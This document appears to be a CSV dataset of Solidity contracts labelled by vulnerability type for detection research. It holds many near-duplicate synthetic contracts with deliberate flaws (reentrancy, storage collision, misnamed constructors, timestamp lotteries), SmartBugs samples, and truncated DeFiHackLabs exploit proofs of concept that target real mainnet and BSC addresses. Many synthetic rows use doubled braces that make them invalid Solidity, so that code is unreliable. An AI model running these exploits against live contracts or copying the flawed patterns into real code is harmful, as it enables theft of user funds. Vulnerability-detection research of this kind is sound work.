source,filename,label,label_id,code
synthetic,synthetic_proxy_storage_collision_154.sol,proxy_storage_collision,9,"pragma solidity ^0.8.0;
contract Proxy {{
    address public implementation;   // slot 0 — collides with logic contract state
    address public admin;            // slot 1
    fallback() external payable {{
        address impl = implementation;
        assembly {{
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {{ revert(0, returndatasize()) }}
            default {{ return(0, returndatasize()) }}
        }}
    }}
}}
contract LogicV1 {{
    address public owner;            // slot 0 — overwrites Proxy.implementation!
    function setOwner(address _o) public {{ owner = _o; }}
}}
// variant_154_1932"
synthetic,synthetic_front_running_mev_126.sol,front_running_mev,7,"pragma solidity ^0.8.0;
contract FrontRunnable {{
    mapping(address => uint) public commitments;
    function commit(bytes32 hash) external payable {{
        commitments[msg.sender] = block.number;  // visible in mempool
    }}
    function reveal(uint secret) external {{
        require(commitments[msg.sender] != 0);
        // attacker can frontrun with same secret
        _reward(msg.sender, secret);
    }}
    function _reward(address to, uint amt) internal {{}}
}}
// variant_126_6816"
synthetic,synthetic_flash_loan_oracle_460.sol,flash_loan_oracle,10,"pragma solidity ^0.8.0;
interface IFlashLoan {{ function flashLoan(uint amount) external; }}
interface IOracle {{ function getPrice() external view returns (uint); }}
contract FlashLoanOracleAttack {{
    IFlashLoan lender;
    IOracle oracle;
    constructor(address _l, address _o) {{ lender = IFlashLoan(_l); oracle = IOracle(_o); }}
    function attack(uint amount) external {{
        lender.flashLoan(amount);
        // Manipulate oracle price here
        uint price = oracle.getPrice();
    }}
    receive() external payable {{}}
}}
// variant_460_9099"
synthetic,synthetic_misnamed_constructor_358.sol,misnamed_constructor,12,"pragma solidity ^0.4.22;
contract MisnamedConstructor {{
    address public owner;
    function MisnamedConstructor() public {{   // old-style constructor — anyone can call
        owner = msg.sender;
    }}
    function withdraw() public {{
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }}
    function() public payable {{}}
}}
// variant_358_2653"
synthetic,synthetic_reentrancy_58.sol,reentrancy,1,"pragma solidity ^0.8.0;
contract ReentrancyVuln {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint amt = balances[msg.sender];
        require(amt > 0);
        (bool ok,) = msg.sender.call{value: amt}("""");  // vulnerable: state updated after call
        require(ok);
        balances[msg.sender] = 0;
    }
}
// variant_58_3149"
synthetic,synthetic_misnamed_constructor_542.sol,misnamed_constructor,12,"pragma solidity ^0.4.22;
contract MisnamedConstructor {{
    address public owner;
    function MisnamedConstructor() public {{   // old-style constructor — anyone can call
        owner = msg.sender;
    }}
    function withdraw() public {{
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }}
    function() public payable {{}}
}}
// variant_542_7640"
synthetic,synthetic_reentrancy_332.sol,reentrancy,1,"pragma solidity ^0.8.0;
contract ReentrancyVuln {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint amt = balances[msg.sender];
        require(amt > 0);
        (bool ok,) = msg.sender.call{value: amt}("""");  // vulnerable: state updated after call
        require(ok);
        balances[msg.sender] = 0;
    }
}
// variant_332_3381"
synthetic,synthetic_timestamp_dependence_521.sol,timestamp_dependence,8,"pragma solidity ^0.8.0;
contract TimestampLottery {{
    uint public jackpot;
    function enter() external payable {{ jackpot += msg.value; }}
    function pickWinner() external {{
        require(block.timestamp % 15 == 0, ""not lucky time"");  // miner-manipulable
        payable(msg.sender).transfer(jackpot);
        jackpot = 0;
    }}
}}
// variant_521_5890"
synthetic,synthetic_reentrancy_304.sol,reentrancy,1,"pragma solidity ^0.8.0;
contract ReentrancyVuln {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint amt = balances[msg.sender];
        require(amt > 0);
        (bool ok,) = msg.sender.call{value: amt}("""");  // vulnerable: state updated after call
        require(ok);
        balances[msg.sender] = 0;
    }
}
// variant_304_3263"
synthetic,synthetic_reentrancy_545.sol,reentrancy,1,"pragma solidity ^0.8.0;
contract ReentrancyVuln {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint amt = balances[msg.sender];
        require(amt > 0);
        (bool ok,) = msg.sender.call{value: amt}("""");  // vulnerable: state updated after call
        require(ok);
        balances[msg.sender] = 0;
    }
}
// variant_545_3100"
smartbugs,token.sol,integer_overflow,2,"/*
 * @source: https://github.com/sigp/solidity-security-blog
 * @author: Steve Marx
 * @vulnerable_at_lines: 20,22
 */

 pragma solidity ^0.4.18;

 contract Token {

   mapping(address => uint) balances;
   uint public totalSupply;

   function Token(uint _initialSupply) {
     balances[msg.sender] = totalSupply = _initialSupply;
   }

   function transfer(address _to, uint _value) public returns (bool) {
     // <yes> <report> ARITHMETIC
     require(balances[msg.sender] - _value >= 0);
     // <yes> <report> ARITHMETIC
     balances[msg.sender] -= _value;
     balances[_to] += _value;
     return true;
   }

   function balanceOf(address _owner) public constant returns (uint balance) {
     return balances[_owner];
   }
 }"
synthetic,synthetic_timestamp_dependence_21.sol,timestamp_dependence,8,"pragma solidity ^0.8.0;
contract TimestampLottery {{
    uint public jackpot;
    function enter() external payable {{ jackpot += msg.value; }}
    function pickWinner() external {{
        require(block.timestamp % 15 == 0, ""not lucky time"");  // miner-manipulable
        payable(msg.sender).transfer(jackpot);
        jackpot = 0;
    }}
}}
// variant_21_7102"
synthetic,synthetic_front_running_mev_436.sol,front_running_mev,7,"pragma solidity ^0.8.0;
contract FrontRunnable {{
    mapping(address => uint) public commitments;
    function commit(bytes32 hash) external payable {{
        commitments[msg.sender] = block.number;  // visible in mempool
    }}
    function reveal(uint secret) external {{
        require(commitments[msg.sender] != 0);
        // attacker can frontrun with same secret
        _reward(msg.sender, secret);
    }}
    function _reward(address to, uint amt) internal {{}}
}}
// variant_436_3290"
defihack,MIMSpell3_exp.sol,other,13,"// SPDX-License-Identifier: UNLICENSED
// @KeyInfo - Total Lost : 1.7M USD
// Attacker : https://etherscan.io/address/0x1aaade3e9062d124b7deb0ed6ddc7055efa7354d
// Attack Contract : https://etherscan.io/address/0xb8e0a4758df2954063ca4ba3d094f2d6eda9b993
// Vulnerable Contract : https://etherscan.io/address/0x46f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c
// Attack Tx : https://etherscan.io/tx/0x842aae91c89a9e5043e64af34f53dc66daf0f033ad8afbf35ef0c93f99a9e5e6

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x46f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : N/A
// Hacking God : N/A
pragma solidity ^0.8.15;

import ""../basetest.sol"";
import ""../interface.sol"";

// Interfaces
interface IBentoBox {
    function balanceOf(address token, address user) external view returns (uint256);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256);
    function withdraw(
        address token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
}

interface ICauldron {
    function cook(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable returns (uint256 value1, uint256 value2);
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
}

interface ICurveRouter {
    function exchange(
        address[11] calldata route,
        uint256[5][5] calldata swap_params,
        uint256 amount,
        uint256 expected,
        address[5] calldata pools,
        address receiver
    ) external returns (uint256);
}

interface ICurve3Pool {
    function remove_liquidity(uint256 amount, uint256[3] calldata min_amounts) external returns (uint256[3] memory);

    function remove_liquidity_one_coin(uint256 token_amount, int128 i, uint256 min_amount) external;
}

interface IUniswapV3Router {
    struct ExactInputParams {
        bytes"
synthetic,synthetic_dos_gas_378.sol,dos_gas,5,"pragma solidity ^0.8.0;
contract DoSGasVuln {
    address[] public investors;
    mapping(address => uint) public balances;
    function invest() external payable { investors.push(msg.sender); balances[msg.sender] += msg.value; }
    function refundAll() external {
        for (uint i = 0; i < investors.length; i++) {
            address investor = investors[i];
            payable(investor).transfer(balances[investor]);
        }
    }
}
// variant_378_5995"
synthetic,synthetic_timestamp_dependence_218.sol,timestamp_dependence,8,"pragma solidity ^0.8.0;
contract TimestampLottery {{
    uint public jackpot;
    function enter() external payable {{ jackpot += msg.value; }}
    function pickWinner() external {{
        require(block.timestamp % 15 == 0, ""not lucky time"");  // miner-manipulable
        payable(msg.sender).transfer(jackpot);
        jackpot = 0;
    }}
}}
// variant_218_6198"
synthetic,synthetic_flash_loan_oracle_506.sol,flash_loan_oracle,10,"pragma solidity ^0.8.0;
interface IFlashLoan {{ function flashLoan(uint amount) external; }}
interface IOracle {{ function getPrice() external view returns (uint); }}
contract FlashLoanOracleAttack {{
    IFlashLoan lender;
    IOracle oracle;
    constructor(address _l, address _o) {{ lender = IFlashLoan(_l); oracle = IOracle(_o); }}
    function attack(uint amount) external {{
        lender.flashLoan(amount);
        // Manipulate oracle price here
        uint price = oracle.getPrice();
    }}
    receive() external payable {{}}
}}
// variant_506_7275"
synthetic,synthetic_dos_gas_27.sol,dos_gas,5,"pragma solidity ^0.8.0;
contract DoSGasVuln {
    address[] public investors;
    mapping(address => uint) public balances;
    function invest() external payable { investors.push(msg.sender); balances[msg.sender] += msg.value; }
    function refundAll() external {
        for (uint i = 0; i < investors.length; i++) {
            address investor = investors[i];
            payable(investor).transfer(balances[investor]);
        }
    }
}
// variant_27_3598"
synthetic,synthetic_timestamp_dependence_287.sol,timestamp_dependence,8,"pragma solidity ^0.8.0;
contract TimestampLottery {{
    uint public jackpot;
    function enter() external payable {{ jackpot += msg.value; }}
    function pickWinner() external {{
        require(block.timestamp % 15 == 0, ""not lucky time"");  // miner-manipulable
        payable(msg.sender).transfer(jackpot);
        jackpot = 0;
    }}
}}
// variant_287_8909"
synthetic,synthetic_proxy_storage_collision_191.sol,proxy_storage_collision,9,"pragma solidity ^0.8.0;
contract Proxy {{
    address public implementation;   // slot 0 — collides with logic contract state
    address public admin;            // slot 1
    fallback() external payable {{
        address impl = implementation;
        assembly {{
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {{ revert(0, returndatasize()) }}
            default {{ return(0, returndatasize()) }}
        }}
    }}
}}
contract LogicV1 {{
    address public owner;            // slot 0 — overwrites Proxy.implementation!
    function setOwner(address _o) public {{ owner = _o; }}
}}
// variant_191_2079"
synthetic,synthetic_reentrancy_76.sol,reentrancy,1,"pragma solidity ^0.8.0;
contract ReentrancyVuln {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint amt = balances[msg.sender];
        require(amt > 0);
        (bool ok,) = msg.sender.call{value: amt}("""");  // vulnerable: state updated after call
        require(ok);
        balances[msg.sender] = 0;
    }
}
// variant_76_8279"
synthetic,synthetic_flash_loan_single_block_557.sol,flash_loan_single_block,11,"pragma solidity ^0.8.0;
interface IERC20 {{ function transfer(address to, uint amount) external returns (bool); }}
interface IPool {{ function borrow(uint amount) external; function repay(uint amount) external; }}
contract SingleBlockFlashAttack {{
    IPool pool;
    IERC20 token;
    constructor(address _pool, address _token) {{ pool = IPool(_pool); token = IERC20(_token); }}
    function execute(uint amount) external {{
        pool.borrow(amount);           // borrow in same block
        // exploit logic
        pool.repay(amount);            // repay in same block
    }}
}}
// variant_557_5831"
synthetic,synthetic_flash_loan_oracle_477.sol,flash_loan_oracle,10,"pragma solidity ^0.8.0;
interface IFlashLoan {{ function flashLoan(uint amount) external; }}
interface IOracle {{ function getPrice() external view returns (uint); }}
contract FlashLoanOracleAttack {{
    IFlashLoan lender;
    IOracle oracle;
    constructor(address _l, address _o) {{ lender = IFlashLoan(_l); oracle = IOracle(_o); }}
    function attack(uint amount) external {{
        lender.flashLoan(amount);
        // Manipulate oracle price here
        uint price = oracle.getPrice();
    }}
    receive() external payable {{}}
}}
// variant_477_9702"
synthetic,synthetic_flash_loan_single_block_490.sol,flash_loan_single_block,11,"pragma solidity ^0.8.0;
interface IERC20 {{ function transfer(address to, uint amount) external returns (bool); }}
interface IPool {{ function borrow(uint amount) external; function repay(uint amount) external; }}
contract SingleBlockFlashAttack {{
    IPool pool;
    IERC20 token;
    constructor(address _pool, address _token) {{ pool = IPool(_pool); token = IERC20(_token); }}
    function execute(uint amount) external {{
        pool.borrow(amount);           // borrow in same block
        // exploit logic
        pool.repay(amount);            // repay in same block
    }}
}}
// variant_490_4475"
synthetic,synthetic_timestamp_dependence_430.sol,timestamp_dependence,8,"pragma solidity ^0.8.0;
contract TimestampLottery {{
    uint public jackpot;
    function enter() external payable {{ jackpot += msg.value; }}
    function pickWinner() external {{
        require(block.timestamp % 15 == 0, ""not lucky time"");  // miner-manipulable
        payable(msg.sender).transfer(jackpot);
        jackpot = 0;
    }}
}}
// variant_430_2609"
synthetic,synthetic_front_running_mev_348.sol,front_running_mev,7,"pragma solidity ^0.8.0;
contract FrontRunnable {{
    mapping(address => uint) public commitments;
    function commit(bytes32 hash) external payable {{
        commitments[msg.sender] = block.number;  // visible in mempool
    }}
    function reveal(uint secret) external {{
        require(commitments[msg.sender] != 0);
        // attacker can frontrun with same secret
        _reward(msg.sender, secret);
    }}
    function _reward(address to, uint amt) internal {{}}
}}
// variant_348_4568"
synthetic,synthetic_dos_gas_185.sol,dos_gas,5,"pragma solidity ^0.8.0;
contract DoSGasVuln {
    address[] public investors;
    mapping(address => uint) public balances;
    function invest() external payable { investors.push(msg.sender); balances[msg.sender] += msg.value; }
    function refundAll() external {
        for (uint i = 0; i < investors.length; i++) {
            address investor = investors[i];
            payable(investor).transfer(balances[investor]);
        }
    }
}
// variant_185_6319"
smartbugs,0x7b368c4e805c3870b6c49a3f1f49f69af8662cf3.sol,reentrancy,1,"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 29
 */

pragma solidity ^0.4.25;

contract W_WALLET
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }

    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }

    function() 
    public 
    payable
    {
        Put(0);
    }

    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }

    mapping (address => Holder) public Acc;

    Log LogFile;

    uint public MinSum = 1 ether;    

    function W_WALLET(address log) public{
        LogFile = Log(log);
    }
}


contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;

    Message LastMsg;

    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}"
synthetic,synthetic_misnamed_constructor_68.sol,misnamed_constructor,12,"pragma solidity ^0.4.22;
contract MisnamedConstructor {{
    address public owner;
    function MisnamedConstructor() public {{   // old-style constructor — anyone can call
        owner = msg.sender;
    }}
    function withdraw() public {{
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }}
    function() public payable {{}}
}}
// variant_68_7438"
synthetic,synthetic_flash_loan_single_block_275.sol,flash_loan_single_block,11,"pragma solidity ^0.8.0;
interface IERC20 {{ function transfer(address to, uint amount) external returns (bool); }}
interface IPool {{ function borrow(uint amount) external; function repay(uint amount) external; }}
contract SingleBlockFlashAttack {{
    IPool pool;
    IERC20 token;
    constructor(address _pool, address _token) {{ pool = IPool(_pool); token = IERC20(_token); }}
    function execute(uint amount) external {{
        pool.borrow(amount);           // borrow in same block
        // exploit logic
        pool.repay(amount);            // repay in same block
    }}
}}
// variant_275_1042"
synthetic,synthetic_timestamp_dependence_299.sol,timestamp_dependence,8,"pragma solidity ^0.8.0;
contract TimestampLottery {{
    uint public jackpot;
    function enter() external payable {{ jackpot += msg.value; }}
    function pickWinner() external {{
        require(block.timestamp % 15 == 0, ""not lucky time"");  // miner-manipulable
        payable(msg.sender).transfer(jackpot);
        jackpot = 0;
    }}
}}
// variant_299_9849"
synthetic,synthetic_flash_loan_oracle_13.sol,flash_loan_oracle,10,"pragma solidity ^0.8.0;
interface IFlashLoan {{ function flashLoan(uint amount) external; }}
interface IOracle {{ function getPrice() external view returns (uint); }}
contract FlashLoanOracleAttack {{
    IFlashLoan lender;
    IOracle oracle;
    constructor(address _l, address _o) {{ lender = IFlashLoan(_l); oracle = IOracle(_o); }}
    function attack(uint amount) external {{
        lender.flashLoan(amount);
        // Manipulate oracle price here
        uint price = oracle.getPrice();
    }}
    receive() external payable {{}}
}}
// variant_13_4582"
synthetic,synthetic_proxy_storage_collision_207.sol,proxy_storage_collision,9,"pragma solidity ^0.8.0;
contract Proxy {{
    address public implementation;   // slot 0 — collides with logic contract state
    address public admin;            // slot 1
    fallback() external payable {{
        address impl = implementation;
        assembly {{
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {{ revert(0, returndatasize()) }}
            default {{ return(0, returndatasize()) }}
        }}
    }}
}}
contract LogicV1 {{
    address public owner;            // slot 0 — overwrites Proxy.implementation!
    function setOwner(address _o) public {{ owner = _o; }}
}}
// variant_207_7171"
synthetic,synthetic_misnamed_constructor_384.sol,misnamed_constructor,12,"pragma solidity ^0.4.22;
contract MisnamedConstructor {{
    address public owner;
    function MisnamedConstructor() public {{   // old-style constructor — anyone can call
        owner = msg.sender;
    }}
    function withdraw() public {{
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }}
    function() public payable {{}}
}}
// variant_384_1998"
synthetic,synthetic_misnamed_constructor_98.sol,misnamed_constructor,12,"pragma solidity ^0.4.22;
contract MisnamedConstructor {{
    address public owner;
    function MisnamedConstructor() public {{   // old-style constructor — anyone can call
        owner = msg.sender;
    }}
    function withdraw() public {{
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }}
    function() public payable {{}}
}}
// variant_98_8225"
synthetic,synthetic_misnamed_constructor_499.sol,misnamed_constructor,12,"pragma solidity ^0.4.22;
contract MisnamedConstructor {{
    address public owner;
    function MisnamedConstructor() public {{   // old-style constructor — anyone can call
        owner = msg.sender;
    }}
    function withdraw() public {{
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }}
    function() public payable {{}}
}}
// variant_499_1149"
synthetic,synthetic_front_running_mev_416.sol,front_running_mev,7,"pragma solidity ^0.8.0;
contract FrontRunnable {{
    mapping(address => uint) public commitments;
    function commit(bytes32 hash) external payable {{
        commitments[msg.sender] = block.number;  // visible in mempool
    }}
    function reveal(uint secret) external {{
        require(commitments[msg.sender] != 0);
        // attacker can frontrun with same secret
        _reward(msg.sender, secret);
    }}
    function _reward(address to, uint amt) internal {{}}
}}
// variant_416_3340"
synthetic,synthetic_flash_loan_oracle_336.sol,flash_loan_oracle,10,"pragma solidity ^0.8.0;
interface IFlashLoan {{ function flashLoan(uint amount) external; }}
interface IOracle {{ function getPrice() external view returns (uint); }}
contract FlashLoanOracleAttack {{
    IFlashLoan lender;
    IOracle oracle;
    constructor(address _l, address _o) {{ lender = IFlashLoan(_l); oracle = IOracle(_o); }}
    function attack(uint amount) external {{
        lender.flashLoan(amount);
        // Manipulate oracle price here
        uint price = oracle.getPrice();
    }}
    receive() external payable {{}}
}}
// variant_336_7049"
defihack,ARK_exp.sol,other,13,"// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import ""forge-std/Test.sol"";
import ""./../interface.sol"";

// TX : https://app.blocksec.com/explorer/tx/bsc/0xe8b0131fa14d0a96327f6b5690159ffa7650d66376db87366ba78d91f17cd677
// GUY : https://twitter.com/Phalcon_xyz/status/1771728823534375249
// Profit : ~348BNB
// REASON : business logic flaw

interface Ark is IERC20 {
    function autoBurnLiquidityPairTokens() external;
}

contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Ark constant ARK = Ark(0xde698B5BBb4A12DDf2261BbdF8e034af34399999);
    Uni_Pair_V2 ARK_WBNB = Uni_Pair_V2(0xc0F54B8755DAF1Fd78933335EfCD761e3D5B4a6F);
    Uni_Router_V2 router = Uni_Router_V2(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() external {
        cheats.createSelectFork(""bsc"", 37_221_235);
        // explotier have
        deal(address(WBNB), address(this), 100);
        deal(address(ARK), address(this), 4 ether);
    }

    function testExploit() external {
        emit log_named_decimal_uint(""[Begin] Attacker WBNB before exploit"", WBNB.balanceOf(address(this)), 18);
        uint256 i = 0;
        while (i < 10_000) {
            ARK.autoBurnLiquidityPairTokens();
            if (ARK.balanceOf(address(ARK_WBNB)) < 1_700_000_000_000) {
                break;
            }
            i++;
        }
        WBNB.transfer(address(ARK_WBNB), 100);
        ARK.transfer(address(ARK_WBNB), ARK.balanceOf(address(this)));
        (uint256 _reserve0, uint256 _reserve1,) = ARK_WBNB.getReserves();
        uint256 Ark_balance = ARK.balanceOf(address(ARK_WBNB));
        address[] memory path = new address[](2);
        path[0] = address(ARK);
        path[1] = address(WBNB);
        uint256[] memory amountOut = router.getAmountsOut(Ark_balance - _reserve1, path);
        ARK_WBNB.swap(amountOut[1], 0, address(this), """");
        emit log_named_decimal_uint(""[End] Attac"
defihack,TecraSpace_exp.sol,other,13,"// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import ""forge-std/Test.sol"";
import ""./../interface.sol"";

/*
    @KeyInfo
    - Total Lost: 639,222 $USDT
    - Attacker: https://etherscan.io/address/0xb19b7f59c08ea447f82b587c058ecbf5fde9c299
    - Attack Contract: https://etherscan.io/address/0x6653d9bcbc28fc5a2f5fb5650af8f2b2e1695a15
    - Vuln Contract: https://etherscan.io/address/0xe38b72d6595fd3885d1d2f770aa23e94757f91a1
    - Attack Tx: https://app.blocksec.com/explorer/tx/eth/0x81e9918e248d14d78ff7b697355fd9f456c6d7881486ed14fdfb69db16631154
*/
interface IUSDTInterface {
    function approve(address spender, uint256 value) external;
}

interface ITcrInterface {
    function burnFrom(address from, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
}

interface IUNIswapV2 {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPairPoolInterface {
    function sync() external;
}

contract ExploitTest is Test {
    address TCR = 0xE38B72d6595FD3885d1D2F770aa23E94757F91a1;
    address usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address route = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address pool = 0x420725A69E79EEffB000F98Ccd78a52369b6C5d4;
    uint256 constant MAX = type(uint256).max;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork(""mainnet"", 14_139_082 - 1);
        cheats.label(address(usdt), ""USDT"");
        cheats.label(address(TCR), ""TCR"");
        cheats.label(address(route), ""UniswapRoute"");
        cheats.label(address(weth), ""WETH"");
        cheats.label(addre"
synthetic,synthetic_flash_loan_oracle_72.sol,flash_loan_oracle,10,"pragma solidity ^0.8.0;
interface IFlashLoan {{ function flashLoan(uint amount) external; }}
interface IOracle {{ function getPrice() external view returns (uint); }}
contract FlashLoanOracleAttack {{
    IFlashLoan lender;
    IOracle oracle;
    constructor(address _l, address _o) {{ lender = IFlashLoan(_l); oracle = IOracle(_o); }}
    function attack(uint amount) external {{
        lender.flashLoan(amount);
        // Manipulate oracle price here
        uint price = oracle.getPrice();
    }}
    receive() external payable {{}}
}}
// variant_72_6313"
synthetic,synthetic_front_running_mev_362.sol,front_running_mev,7,"pragma solidity ^0.8.0;
contract FrontRunnable {{
    mapping(address => uint) public commitments;
    function commit(bytes32 hash) external payable {{
        commitments[msg.sender] = block.number;  // visible in mempool
    }}
    function reveal(uint secret) external {{
        require(commitments[msg.sender] != 0);
        // attacker can frontrun with same secret
        _reward(msg.sender, secret);
    }}
    function _reward(address to, uint amt) internal {{}}
}}
// variant_362_2631"
synthetic,synthetic_timestamp_dependence_273.sol,timestamp_dependence,8,"pragma solidity ^0.8.0;
contract TimestampLottery {{
    uint public jackpot;
    function enter() external payable {{ jackpot += msg.value; }}
    function pickWinner() external {{
        require(block.timestamp % 15 == 0, ""not lucky time"");  // miner-manipulable
        payable(msg.sender).transfer(jackpot);
        jackpot = 0;
    }}
}}
// variant_273_5831"
synthetic,synthetic_timestamp_dependence_529.sol,timestamp_dependence,8,"pragma solidity ^0.8.0;
contract TimestampLottery {{
    uint public jackpot;
    function enter() external payable {{ jackpot += msg.value; }}
    function pickWinner() external {{
        require(block.timestamp % 15 == 0, ""not lucky time"");  // miner-manipulable
        payable(msg.sender).transfer(jackpot);
        jackpot = 0;
    }}
}}
// variant_529_5278"
synthetic,synthetic_dos_gas_252.sol,dos_gas,5,"pragma solidity ^0.8.0;
contract DoSGasVuln {
    address[] public investors;
    mapping(address => uint) public balances;
    function invest() external payable { investors.push(msg.sender); balances[msg.sender] += msg.value; }
    function refundAll() external {
        for (uint i = 0; i < investors.length; i++) {
            address investor = investors[i];
            payable(investor).transfer(balances[investor]);
        }
    }
}
// variant_252_1674"
